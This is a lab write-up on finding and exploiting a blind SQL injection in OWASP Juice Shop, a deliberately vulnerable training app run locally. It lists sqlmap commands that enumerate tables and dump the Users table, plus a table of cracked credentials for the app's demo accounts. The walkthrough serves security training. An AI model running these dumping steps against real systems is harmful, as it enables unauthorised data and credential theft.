# 🔓 SQL Injection Lab – OWASP Juice Shop

This lab demonstrates how to discover and exploit a **boolean-based blind SQL injection** vulnerability in OWASP Juice Shop using `sqlmap`.

---

## 🛠️ Lab Environment

- **Target:** OWASP Juice Shop (Docker)
- **Attacker:** Kali Linux VM
- **Tools Used:** Docker, Firefox Dev Tools, SQLMap

---

## 🚀 Steps Performed

### 1. Started Juice Shop
bash

sudo docker run --rm -p 3000:3000 bkimminich/juice-shop

Juice Shop accessible at: http://localhost:3000

### 2. Found SQLi Vulnerability
Searched for a product in the Juice Shop search bar using '

Captured the backend request: GET /rest/products/search?q=

Used Firefox Dev Tools → “Copy as cURL” → converted into raw HTTP request (juice-request.txt)

## 3. Ran SQLMap

sqlmap -r juice-request.txt --batch --tables

✅ Backend DBMS: SQLite

✅ SQL Injection Type: Boolean-based blind

✅ 20 database tables retrieved

## 4. Dumped Users Table

sqlmap -r juice-request.txt --batch -T Users --dump

## 5. Cracked Password Hashes
SQLMap auto-cracked several MD5 hashes using its built-in dictionary:

| Email                    | Role     | Cracked Password |
| ------------------------ | -------- | ---------------- |
| `J12934@juice-sh.op`     | admin    | `admin123`       |
| `demo`                   | customer | `demo`           |
| `uvogin@juice-sh.op`     | deluxe   | `private`        |
| `accountant@juice-sh.op` | customer | `ncc-1701`       |


## 🧠 Takeaways
SQL injection can still be found in modern web apps using APIs.

SQLite doesn’t support multi-db enumeration, but data can still be dumped.

Weak passwords make post-exploitation trivial.
